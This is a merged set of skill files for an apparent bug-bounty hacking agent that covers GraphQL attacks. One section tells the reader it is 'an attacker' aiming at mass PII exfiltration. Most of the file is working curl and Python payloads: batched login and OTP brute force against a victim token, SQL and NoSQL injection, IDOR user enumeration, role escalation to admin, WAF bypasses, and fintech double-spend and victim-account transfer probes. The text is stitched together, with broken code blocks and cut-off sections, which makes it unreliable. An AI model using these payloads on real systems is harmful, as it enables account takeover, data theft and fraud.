# MERGED SOURCE KNOWLEDGE: graphql

113 unique sections from 5 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/graphql-agent.md

# GraphQL Agent

You are an attacker that exploits GraphQL APIs: missing field-level auth, introspection leaks, batching attacks, alias-based brute force, and mass data exfiltration.

Other agents cover web injection, auth, and access control. You own: GraphQL schema analysis, missing auth detection, query abuse, and PII extraction via GraphQL.

### Introspection & Schema Discovery

**Full introspection query:**
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
      }
    }
  }
}
```

**Find sensitive types:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}

# Look for: User, Report, Program, Email, Token, Secret, PII, Password
```

**Check for disabled introspection:**
```graphql

# If introspection is disabled, try:
{
  __type(name: "User") {
    name
    fields {
      name
      type { name }
    }
  }
}
```

### Missing Field-Level Auth (H100 Proven — 3 reports)

This pattern appeared 3 times in the top 100 reports, enabling mass PII exfil.

**Attack flow:**
```
1. Run introspection → find user-related types
2. Query fields without authentication
3. If sensitive fields (email, PII) returned → missing auth
4. Enumerate all users via pagination or node() queries
5. Extract full user database
```

**Exploit user email disclosure:**
```graphql

# Query user emails without auth
{
  users(first: 100) {
    edges {
      node {
        id
        email
        name
      }
    }
  }
}

# Or via node() query
{
  node(id: "base64(UserType:1)") {
    ... on User {
      email
      name
    }
  }
}
```

**Test field-level auth on mutations:**
```graphql

# Can you mutate without auth?
mutation {
  updateUserProfile(input: { email: "attacker@evil.com" }) {
    user {
      id
      email
    }
  }
}
```

### Batching Attack — Rate Limit Bypass

GraphQL batching sends multiple queries in one request, bypassing rate limits.

**Login brute force:**
```json
[
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass1\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass2\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass3\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass4\") { token } }"},
  {"query": "mutation { login(email:\"user@test.com\",password:\"pass5\") { token } }"}
]
```

**Mass data extraction:**
```json
[
  {"query": "{ users(first:100) { edges { node { id email } } } }"},
  {"query": "{ programs(first:100) { edges { node { id name } } } }"},
  {"query": "{ reports(first:100) { edges { node { id title } } } }"}
]
```

### Alias-Based Brute Force

Aliases let you send the same query multiple times in one request:

```graphql
query {
  a1: login(email: "user@test.com", password: "pass1") { token }
  a2: login(email: "user@test.com", password: "pass2") { token }
  a3: login(email: "user@test.com", password: "pass3") { token }
  a4: login(email: "user@test.com", password: "pass4") { token }
  a5: login(email: "user@test.com", password: "pass5") { token }
  a6: login(email: "user@test.com", password: "pass6") { token }
  a7: login(email: "user@test.com", password: "pass7") { token }
  a8: login(email: "user@test.com", password: "pass8") { token }
  a9: login(email: "user@test.com", password: "pass9") { token }
  a10: login(email: "user@test.com", password: "pass10") { token }
}
```

**Automate with large alias count:**
```python
import json

query = "query {\n"
for i in range(1, 1001):
    query += f'  a{i}: login(email:"user@test.com", password:"pass{i}") {{ token }}\n'
query += "}"

payload = json.dumps({"query": query})
```

# Try other IDs
{
  node(id: "VXNlcjo0NTY=") {  # User:456
    ... on User {
      email
      name
    }
  }
}
```

**Enum-based IDOR:**
```graphql

# If subscriptions are enabled, they may bypass rate limits
subscription {
  onUserUpdate(userId: "123") {
    email
    name
  }
}
```

# Chain mutations for privilege escalation
mutation {
  createOrganization(input: { name: "Evil Org" }) {
    organization {
      id
      inviteUser(email: "attacker@evil.com", role: ADMIN) {
        user { id }
      }
    }
  }
}
```

# Find deprecated fields (may still work)
{
  __type(name: "User") {
    fields(includeDeprecated: true) {
      name
      isDeprecated
      deprecationReason
    }
  }
}
```

### Testing Checklist

- [ ] Run full introspection — find all types and fields
- [ ] Query sensitive fields without auth — test each type
- [ ] Test batch queries (array of queries in one request)
- [ ] Test alias-based brute force (1000 aliases in one query)
- [ ] Decode node IDs — try sequential IDs
- [ ] Check for subscriptions — they may bypass rate limits
- [ ] Test mutation auth — can you mutate without tokens?
- [ ] Look for deprecated fields — may still be accessible
- [ ] Check query depth limits — can you nest deeply?
- [ ] Test with different auth levels (no auth, user, admin)

## Output Fields

Add to FINDINGs:

```
introspection_enabled: true | false
sensitive_types: <list of types with PII fields>
missing_auth_fields: <fields queryable without auth>
batch_abuse_possible: true | false
alias_count_tested: <number of aliases used>
node_id_format: <base64 type:ID | sequential | uuid>
data_exfiltrated: <types and fields extracted>
rate_limit_bypassed: true | false
```

## Rules
- GraphQL introspection alone is informational — must chain to data exfil or auth bypass for paid bounty
- Batching can bypass rate limits on login, password reset, and API calls
- Node IDs are often base64-encoded — decode them to find raw IDs
- Deprecated fields may still work — always test with includeDeprecated: true
- Subscriptions can be real-time data leaks — check if they require auth
- Test with no auth, low-priv auth, and admin auth — different levels may have different access


## SOURCE: hunt-skills/graphql-audit/SKILL.md

# GRAPHQL SECURITY AUDIT

> GraphQL flips the threat model — clients drive queries. One endpoint, infinite attack surface. Introspection hands you the schema; even without it, field suggestions give you 80% back.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run graphql_audit.sh <endpoint> — full automated sweep
[ ] Check if introspection is enabled (__schema query)
[ ] If introspection off — run clairvoyance for field discovery
[ ] Fingerprint engine (graphw00f) — different engines, different CVEs
[ ] Test query batching — send 100 identical queries in one POST
[ ] Test alias bombing — 1000 aliases in one query
[ ] Check field suggestions on typos — leaks schema even when introspection off
[ ] Try IDOR: query another user's object by ID, no auth check
[ ] Test field-level auth: query privileged fields (admin, role, internalNote)
[ ] Inject SQLi/NoSQLi via string arguments — id, filter, search args
[ ] Check subscriptions: can you subscribe to other users' events?
[ ] Try introspection bypass: __schema\nquery, query batching, fragment tricks
[ ] Look for mutation rate limiting — account takeover / self-XSS via mutations
```

---

# With auth cookie
bash tools/graphql_audit.sh https://target.com/api/graphql --cookie "session=abc123"

# With Authorization header
bash tools/graphql_audit.sh https://target.com/graphql --header "Authorization: Bearer TOKEN"

# Through Burp proxy
bash tools/graphql_audit.sh https://target.com/graphql --proxy http://127.0.0.1:8080

# Custom output directory
bash tools/graphql_audit.sh https://target.com/graphql --output-dir ./findings/target/graphql
```

**Output:** `findings/<target>/graphql/<timestamp>/`
- `introspection.json` — full schema dump (if enabled)
- `fingerprint.txt` — engine type (graphw00f)
- `field_suggestions.txt` — discovered fields via clairvoyance
- `batching_dos.txt` — response time delta for 1 vs 100 queries
- `alias_bomb.txt` — alias depth test results
- `gqlmap.txt` — injection scan results
- `cop_report.txt` — graphql-cop attack checklist results
- `summary.txt` — hit/miss per phase

---

### Check If Enabled

```bash
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

# Pull complete introspection schema (pipe to InQL or graphql-voyager)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
  }' | jq . > schema.json
```

### What To Look For In The Schema

```
- Mutations involving user data: updateUser, deleteAccount, changeEmail, changePassword
- Queries returning other users' objects: user(id: X), order(id: X)
- Fields: internalNote, adminOnly, role, isAdmin, rawPassword, apiKey
- Types: AdminUser, InternalConfig, DebugInfo
- Deprecated fields — often bypassed auth or forgotten
- Subscription types — real-time data leaks
```

# Newline injection (bypasses naive keyword filters)
{"query": "query {\n  __schema\n  { queryType { name } } }"}

# __type instead of __schema (often overlooked in blocklists)
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Via GET request (some servers allow GET, filter only POST)
GET /graphql?query={__schema{queryType{name}}}

## 3. FIELD SUGGESTION ABUSE (Introspection Off — Still Works)

GraphQL engines return helpful "Did you mean X?" errors on typos. This leaks field names.

# Typo on a known field to trigger suggestions
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}' | grep -i "suggest\|did you mean\|Cannot query"
```

# Run field discovery against a known type
clairvoyance -u https://target.com/graphql -o schema.json

# With auth
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -o schema.json

# Seed with known type names (speeds up discovery significantly)
clairvoyance -u https://target.com/graphql \
  --input-document schema_partial.json \
  -o schema_full.json
```

**What clairvoyance recovers:** type names, field names, argument names — ~80% of introspection output even when blocked.

---

## 4. BATCHING DoS (High Payout, Easy to Prove)

GraphQL allows sending multiple operations in one POST. No rate limit = DoS or brute-force amplifier.

# 100 queries in one request — measure response time delta
python3 -c "
import json, sys
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

# 500 aliases — each alias is a separate resolver call
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

### Impact Escalation

- **Brute force amplifier:** 100 login mutations per HTTP request → bypasses per-IP lockout
- **OTP bypass:** 1000 alias queries testing OTP codes in one request
- **Password reset bombing:** 100 resetPassword mutations, each with a different email

```bash

# OTP brute force via alias batching — chain with account takeover
python3 -c "
import json
mutations = []
for code in range(1000, 2000):
    mutations.append(f'v{code}: verifyOTP(code: \"{code}\", token: \"VICTIM_TOKEN\") {{ success }}')
query = '{ ' + ' '.join(mutations) + ' }'
print(json.dumps({'query': query}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 5. IDOR VIA DIRECT OBJECT ACCESS

GraphQL queries often accept IDs directly. Test whether the server enforces ownership.

# Logged in as user A (id=1) — query user B's data
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ user(id: 2) { email phone address paymentMethods { last4 } } }"}'

# Try orders, messages, invoices, appointments
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ order(id: 999) { total items { name } user { email } } }"}'
```

# Object is yours — but are ALL fields yours to read?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'

# Test privileged mutations on other users
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
```

# Enumerate 50 user IDs in one request
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 6. INJECTION VIA ARGUMENTS

GraphQL arguments pass directly to resolvers. Resolvers often pass them to SQL/NoSQL queries without sanitization.

# Classic SQLi probe via search/filter args
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(search: \"admin'\''--\") { id email } }"}'

# Time-based blind SQLi
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(id: \"1 AND SLEEP(5)--\") { email } }"}'

# gqlmap for automated injection
gqlmap --target https://target.com/graphql \
  --query '{ users(search: GQLMAP) { id email } }' \
  --dbms mysql
```

# MongoDB operator injection via JSON coercion
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'

# Regex bypass
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(filter: {email: {\"$regex\": \".*\"}}) { id email } }"}'
```

# If description/bio fields render in templates
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateProfile(bio: \"{{7*7}}\") { bio } }"}'
```

---

# Try sensitive queries without any auth token
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id email role } }"}'

# Try mutations without auth
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { createAdmin(email: \"test@example.com\", password: \"pass\") { id } }"}'
```

# Step 2: Call it as a regular user
curl -s -X POST https://target.com/graphql \
  -H 'Cookie: session=NORMAL_USER' \
  -d '{"query":"mutation { updateUserRole(userId: ME_ID, role: \"ADMIN\") { success } }"}'
```

# Deprecated fields are often forgotten — auth checks removed or loosened
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ userProfile(id: 2) { legacyToken adminFlags } }"}'
```

---

## 8. SUBSCRIPTION ABUSE

WebSocket-based subscriptions can leak cross-user events if not scoped per-user.

```bash

# Then: change userId to victim's ID

wscat -c wss://target.com/graphql \
  -s 'graphql-ws' \
  --execute '{"type":"start","id":"1","payload":{"query":"subscription { orderUpdated(userId: VICTIM_ID) { status total } }"}}'

## 9. DEPTH / COMPLEXITY BOMBS

No query depth/complexity limits = DoS.

```bash

# e.g. User -> friends -> User -> friends -> ...
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'

## 10. FINGERPRINTING & CVE HUNTING (graphw00f)

Different GraphQL engines have different CVEs. Fingerprint first.

```bash

# With auth
graphql-cop -t https://target.com/graphql \
  -H "Authorization: Bearer TOKEN"

# Content-type switching (some WAFs only filter application/json)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/graphql' \
  -d '{ __schema { queryType { name } } }'

# GET introspection (WAF may only block POST)
curl -s "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Comment injection to break keyword matching
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ __sch#comment\nema { queryType { name } } }"}'

# Fragment-based introspection
curl -s -X POST https://target.com/graphql \
  -d '{"query":"fragment s on __Schema { queryType { name } } query { ...s }"}'
```

---

## 13. CHAINING FINDINGS

| Chain | Severity |
|---|---|
| Introspection → find admin mutations → call without auth | Critical |
| Batching → OTP brute force → account takeover | Critical |
| Field suggestions → discover hidden field → IDOR | High |
| Alias bomb → bypass rate limit → credential stuffing | High |
| Unauthenticated subscription → real-time PII leak | High |
| Depth bomb → no query limits → DoS | Medium |
| Deprecated field → PII exposure | Medium |

---

## 14. REPORT TEMPLATE

```
Title: GraphQL [VULN TYPE] — [Impact One-liner]

Example titles:
- "GraphQL Introspection Enabled — Full Schema Disclosure on api.target.com"
- "GraphQL Batching Allows OTP Brute Force — Account Takeover via Alias Bombing"
- "GraphQL IDOR via Direct Object Queries — Access Any User's Private Data"

Endpoint: POST https://target.com/graphql

Request:
[paste raw curl or HTTP request]

Response:
[paste relevant portion of response]

Impact:
[what an attacker can actually do RIGHT NOW — no hypotheticals]

Steps to Reproduce:
1. [exact curl or Burp Repeater step]
2. [observe the response]
3. [confirm impact]

CVSS (approximate):
- Introspection only: CVSS 5.3 (Medium) — info disclosure
- IDOR cross-user: CVSS 7.5-8.5 (High)
- Batching ATO chain: CVSS 9.0+ (Critical)
- Unauthenticated mutation: CVSS 9.8 (Critical)

Remediation:
- Disable introspection in production (allow only in dev environments)
- Enforce per-query depth limit (recommend <= 10)
- Enforce complexity limits
- Disable query batching or add per-batch rate limits
- Validate object ownership in every resolver (not just at route level)
- Remove field suggestions in production
```

---

## KILL SIGNALS — Walk Away

```
- Endpoint returns 404/410 consistently — not active
- All queries return generic "Unauthorized" with no suggestions — well-hardened
- Rate limit fires on query 2 — strong protection, low ROI
- Only __typename accessible, no types — schema fully locked down
- Engine is Apollo Federation gateway only — attack the downstream services instead
```

---

## TOOLS REFERENCE

| Tool | Purpose | Install |
|---|---|---|
| `graphql_audit.sh` | Automated multi-phase sweep | this repo |
| `graphw00f` | Engine fingerprinting | `pip install graphw00f` |
| `clairvoyance` | Field discovery (no introspection) | `pip install clairvoyance` |
| `graphql-cop` | Attack checklist runner | `pip install graphql-cop` |
| `gqlmap` | SQL/NoSQL injection scanner | `pip install gqlmap` |
| `inql` | Burp Suite extension — schema + IDOR | Burp BApp Store |
| `graphql-voyager` | Visual schema explorer | browser tool |
| `wscat` | WebSocket subscription testing | `npm i -g wscat` |


## SOURCE: hunt-skills/hunt-fintech-graphql/SKILL.md

## Why Fintech GraphQL Is a Different Risk Class

Generic GraphQL bugs (IDOR, mass assignment, introspection, batching abuse — see `hunt-graphql`)
still apply here, but the blast radius changes completely: a resolver bug in a SaaS app leaks
data, the same class of bug in a ledger mutation **moves money**. Three properties make fintech
GraphQL backends a distinct hunting surface:

- **Money-movement mutations are almost always resolvers over a double-entry ledger.** A single
  GraphQL mutation (`transferFunds`, `redeemRewards`, `withdrawToBank`) can trigger multiple
  ledger writes (debit + credit + fee) that must be atomic. GraphQL's flexible input shape and
  alias batching make it easy to desynchronize those writes.
- **Decimals are attacker-controlled input, not display formatting.** Amounts, exchange rates,
  interest, and rewards points are usually passed as GraphQL scalars (`Float`, `String`, custom
  `Decimal`/`Money` scalar). How the resolver parses and rounds that value is exploitable surface
  in its own right — this barely exists in non-financial GraphQL APIs.
- **KYC/PII fields sit next to routine account fields in the same type.** `User` or `Account`
  types commonly expose `ssnLast4`, `routingNumber`, `kycStatus`, `governmentIdUrl`, or
  `linkedBankAccount` alongside `displayName` and `email` — one missing field-level authorization
  check on a type used everywhere in the schema fans out to every query that touches it.

---

## Attack Surface Signals

**URL / schema naming patterns (in addition to `hunt-graphql`'s generic `/graphql` list):**
```
/graphql/ledger
/graphql/payments
/api/wallet/graphql
/internal/ledger-graphql
/banking/graphql
```

**Field/type names worth grepping schema introspection or JS bundles for:**
```
balance, availableBalance, pendingBalance, ledgerEntry, ledgerEntries
transferFunds, withdraw, redeem, topUp, reverseTransaction, adjustBalance
kycStatus, ssnLast4, routingNumber, accountNumber, governmentIdUrl
quoteExchangeRate, interestAccrued, rewardsPoints, portfolioValue
idempotencyKey, clientMutationId
```

**Tech-stack tells specific to this vertical:**
- Plaid/Stripe/Dwolla/Marqeta wrapped behind an internal GraphQL gateway (`bankLink`, `plaidLinkToken` mutations)
- Apollo Federation with a dedicated `ledger` or `payments` subgraph — check for the subgraph's own introspection being reachable directly, bypassing the gateway's stitched-down schema
- Custom `Money`/`Decimal`/`BigDecimal` GraphQL scalar in the schema (`scalar Money`) — the parser for this scalar is worth fuzzing directly

Run `hunt-graphql`'s discovery + introspection methodology first to get the schema; everything
below assumes you already have (or have partially enumerated) a schema with money-movement types.

---

## Step-by-Step Hunting Methodology

1. **Map every mutation that touches balance, whether directly or as a side effect.** Not just
   `transfer*`/`withdraw*` — also `redeemRewards`, `applyCoupon`, `upgradeTier`,
   `closeAccount` (often refunds a balance), `disputeTransaction` (often provisionally credits).

2. **For each money-movement mutation, identify the ledger write shape.** Does one mutation call
   produce one ledger entry or several (debit sender, credit receiver, fee entry)? Multi-entry
   writes are the ones worth racing — see Stage 4.

3. **Test idempotency-key handling.** Send the identical mutation (same `idempotencyKey` /
   `clientMutationId`) twice, back-to-back and with a delay. A ledger write on the second call
   means idempotency isn't enforced server-side — replay = double-execute.

4. **Test decimal/precision edge cases** on every amount-accepting argument — see Payload section.
   Confirm server-side rounding matches client-displayed rounding; a mismatch is directly
   monetizable.

5. **Probe cross-account IDOR on account/portfolio node IDs**, same as `hunt-idor`/`hunt-graphql`,
   but specifically test whether a `transferFunds`-style mutation validates that the
   **source account belongs to the authenticated caller** — not just that *some* account with
   that ID exists. This is the fintech-specific IDOR: authz on the *source* of a debit is easy to
   forget when authz on the *destination* of a credit was correctly implemented (crediting an
   arbitrary account "looks safe" to a developer; debiting one clearly isn't, so it gets checked
   — but sometimes only one direction does).

6. **Check field-level authorization on KYC/PII fields** by querying the shared `User`/`Account`
   type from every context that returns it — not just the profile screen. A `transaction` type
   that embeds `counterparty { ssnLast4 }` is a common place for the check to be missing, because
   the developer authorized the top-level `transaction` query but didn't re-check field access on
   the nested `counterparty`.

7. **Look for admin-tier mutations reachable via mass assignment**, not just a missing auth
   check — e.g. an input object with a client-settable `status` or `override` field that a normal
   user's mutation shouldn't expose but that the resolver accepts anyway
   (`updateTransaction(input: {id, status: "COMPLETED", amount: "..."})`).

8. **Test currency-argument consistency.** Send a transfer/quote mutation with mismatched
   `sourceCurrency`/`targetCurrency` combinations the UI never generates (e.g. self-transfer with
   a currency conversion) and check whether the resolver's FX-rate lookup and the ledger write use
   the same rate — a TOCTOU window here is a direct arbitrage bug.

9. **Combine alias batching with money-movement mutations** to test for double-spend — see
   `hunt-race-condition` for the parallel-HTTP escalation once alias batching alone confirms the
   resolver isn't serializing writes per-account.

---

## Payload & Detection Patterns

**Idempotency-key replay test:**
```graphql
mutation {
  transferFunds(input: {
    idempotencyKey: "test-key-001"
    sourceAccountId: "acc_1"
    destAccountId: "acc_2"
    amount: "10.00"
  }) { transactionId status }
}
```
Send twice with the identical `idempotencyKey`. Two successful, distinct `transactionId` values
= idempotency not enforced.

**Decimal-precision / rounding probes:**
```graphql
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "0.001"}) { transactionId } }
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "9999999999999999.99"}) { transactionId } }
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "1e2"}) { transactionId } }
mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "-50.00"}) { transactionId } }
```
Sub-cent amounts test truncate-vs-round handling (repeat N times to accumulate a rounding-error
balance drift); scientific notation and oversized values test whether the `Money`/`Decimal`
scalar parser falls back to a native float/int with overflow or precision-loss behavior; negative
amounts test whether the resolver assumes sign server-side or trusts the client's.

**Alias-batched double-spend probe (confirm before escalating to parallel HTTP):**
```graphql
mutation {
  r1: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }
  r2: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }
  r3: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }
}
```
If more than one alias succeeds against a single-use reward/coupon, the resolver doesn't
serialize per-account/per-resource writes within a batched request — see `hunt-race-condition`
for combining this with parallel HTTP POSTs to confirm real double-spend impact.

**Source-account authorization probe (asymmetric IDOR check):**
```graphql
mutation {
  transferFunds(input: {
    sourceAccountId: "VICTIM_ACCOUNT_ID"
    destAccountId: "ATTACKER_CONTROLLED_ACCOUNT_ID"
    amount: "1.00"
  }) { transactionId status }
}
```
Run as the attacker's own session/token. Success = the resolver validated the destination is
attacker-controlled (obviously required) but never validated that the source belongs to the
caller.

**Nested field-level PII probe:**
```graphql
query {
  transaction(id: "txn_123") {
    amount
    counterparty { displayName ssnLast4 routingNumber kycStatus }
  }
}
```
Query as a user with no relationship to the counterparty beyond a shared transaction; success on
the nested PII fields is the finding even if the top-level `transaction` query correctly scoped
the transaction itself.

**Mass-assignment probe on admin-shaped input fields:**
```graphql
mutation {
  updateTransaction(input: {id: "txn_123", status: "COMPLETED", amount: "0.01"}) { id status }
}
```
Send as a non-admin user against a mutation the client UI never exposes these fields for; a
schema that accepts them anyway is mass assignment onto ledger state.

---

## Common Root Causes

1. **Client-side amount/fee validation only.** The UI computes and displays the correct amount;
   the resolver trusts whatever the GraphQL client actually sends, because "the app always sends
   the right value."
2. **Non-atomic multi-entry ledger writes.** Debit, credit, and fee entries are written as
   separate sequential statements instead of inside a single transaction/lock — the race window
   this creates is exactly what alias batching + parallel HTTP exploits.
3. **`Money`/`Decimal` scalar falls back to native float parsing** under edge-case input
   (scientific notation, oversized strings), reintroducing floating-point rounding error into a
   system that was supposed to guarantee fixed-point precision.
4. **Idempotency keys are stored but never checked before executing the write** — the key is
   logged for support/debugging purposes, not used as a dedup gate.
5. **Field-level authorization implemented per top-level query, not per type.** A `User`/`Account`
   type's sensitive fields are protected when queried directly (`me { ssnLast4 }`) but not when
   the same type is returned nested inside an unrelated query (`transaction { counterparty {...} }`).
6. **Source-account ownership check missing while destination-account existence check is
   present** — see methodology step 5. Debiting looks dangerous so it gets reviewed; the "does
   this account belong to the caller" check quietly only gets applied to the credited side.
7. **Admin/internal mutations reuse the same input type as the public mutation**, just with extra
   optional fields — nothing at the resolver layer strips those fields for non-admin callers.

---

## Gate 0 Validation

Money-movement findings need a stricter bar than a typical GraphQL IDOR — "the query returns
someone else's balance" is real impact; "I sent a malformed amount and got a 400" is not.

1. **Did an actual ledger write occur, and can you show it?** Query the account balance before
   and after — a state change (not just a `200`/success response body) is the proof.
2. **Is the win deterministic, not a timing fluke?** For race/double-spend findings, reproduce
   twice from a clean state. If it only works under specific load conditions, document the window
   honestly rather than claiming guaranteed exploitability.
3. **Does the finding move value the attacker didn't have, or reveal data they shouldn't see** —
   not just "the mutation accepted an unexpected input type and the API returned an error
   message." A verbose GraphQL error leaking a stack trace on a malformed `Money` scalar is a
   `hunt-source-leak`-class finding, not a fintech-logic one — don't conflate the two in a report.

---

## Related Skills & Chains

- **`hunt-graphql`** — parent skill for generic GraphQL discovery, introspection bypass, node-ID
  IDOR, and alias-batching mechanics. Load this skill first; `hunt-fintech-graphql` assumes that
  methodology and only adds the money-movement-specific delta.
- **`hunt-business-logic`** — coupon/reward double-redemption and other logic-flaw patterns
  generalize directly to `redeemRewards`/`applyCoupon`-style mutations here.
- **`hunt-race-condition`** — the escalation path once alias batching alone confirms a
  money-movement mutation doesn't serialize writes: combine with parallel-HTTP / single-packet
  attack for a deterministic double-spend PoC.
- **`hunt-api-misconfig`** — mass assignment and JWT-claim tampering patterns apply directly to
  admin-shaped GraphQL input objects reachable by normal users.
- **`hunt-idor`** — the source-account-vs-destination-account asymmetric authz pattern (step 5) is
  a fintech-specific instance of the general IDOR-on-mutation-argument class.
- **`evidence-hygiene`** — balance screenshots and ledger-entry PoCs need the same cookie/PII
  redaction discipline as any other capture, plus care that a real account number/balance from a
  live financial account is never included verbatim.
- **`triage-validation`** — apply Gate 0 above before drafting; a fintech program's triage team
  will kill anything without a demonstrated ledger state change immediately.


## SOURCE: hunt-skills/hunt-graphql/SKILL.md

## Crown Jewel Targets

GraphQL vulnerabilities are high-value because the attack surface is both broad and deep — a single endpoint can expose entire data models, privilege escalation paths, and cross-API state confusion. Highest payouts occur in:

- **Platform APIs** (GitHub, Shopify, Stripe-tier targets) where GraphQL mutations interact with REST APIs managing the same resources
- **Race conditions between GraphQL mutations and REST endpoints** where state synchronization is non-atomic — these hit medium-to-high severity reliably
- **Authorization persistence bugs** where team/org/repo membership state is controlled by one API but readable/writable by another
- **B2B SaaS platforms** where one tenant affecting another via schema traversal = critical
- **Internal admin GraphQL endpoints** accidentally exposed to lower-privilege users

The GitHub reports demonstrate the crown jewel pattern: **privilege that should be revoked persists because two APIs disagree on ground truth**.

---

## Attack Surface Signals

**URL Patterns:**
```
/graphql
/api/graphql
/v1/graphql
/query
/gql
/graph
/api/v2/graphql
/internal/graphql
```

**Response Headers:**
```
Content-Type: application/json  (with query body)
X-Request-Id + no REST-style path params = likely GraphQL
```

**JavaScript Source Patterns:**
```js
// grep for these in JS bundles
"query {"
"mutation {"
"__typename"
"apollo"
"ApolloClient"
"graphql-tag"
"gql`"
"operationName"
"GRAPHQL_URI"
```

**Tech Stack Signals:**
- Apollo Server/Client in JS bundles
- Relay in React apps
- `graphene` or `strawberry` (Python), `graphql-ruby`, `gqlgen` (Go), `Lighthouse` (Laravel)
- POST requests with `{"query": "..."}` body shape in Burp history
- `__schema` or `__type` in any response = confirmed GraphQL

**Recon Sources:**
- `github.com` search: `"graphql" site:target.com`
- Wayback Machine for `/graphql` paths
- JS bundle scanning with `LinkFinder` or `getallurls`

---

## Step-by-Step Hunting Methodology

1. **Discover the endpoint** — spider JS bundles, check `/graphql`, `/api/graphql`, review Burp passive scan hits for `application/json` POST with query fields

2. **Test introspection** — send the full introspection query. Even if blocked, try field-level enumeration:
   ```graphql
   { __typename }
   ```
   If that returns, introspection may be partially blocked but the schema is discoverable

3. **Map the full schema** — use `InQL` (Burp extension) or `graphql-voyager` to visualize relationships. Specifically look for:
   - Mutations that modify ownership, permissions, or membership
   - Mutations that mirror REST API functionality

4. **Identify REST/GraphQL overlap** — document every resource that can be modified via BOTH REST and GraphQL. These dual-write surfaces are your RC targets.

5. **Test authorization boundaries per mutation** — replay mutations as lower-privilege users. Does the server enforce the same authz as the equivalent REST call?

6. **Hunt cross-API state desync** — find sequences where:
   - REST action should revoke access
   - GraphQL mutation re-grants or preserves it
   - Test the ordering: REST first → GraphQL → check state; then GraphQL first → REST → check state

7. **Test for persistent privilege after role/membership changes** — remove a user via REST, then call the corresponding GraphQL mutation for that resource. Query current state via both APIs and compare.

8. **Probe for IDOR in node IDs** — GraphQL global IDs often encode object type + ID. Swap IDs across object boundaries and across account contexts.

9. **Check batch query abuse** — send arrays of operations to bypass rate limiting or amplify enumeration.

10. **Document the exact reproduction chain** — for RC bugs, time-based steps must be reproducible deterministically.

---

## Payload & Detection Patterns

**Full Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
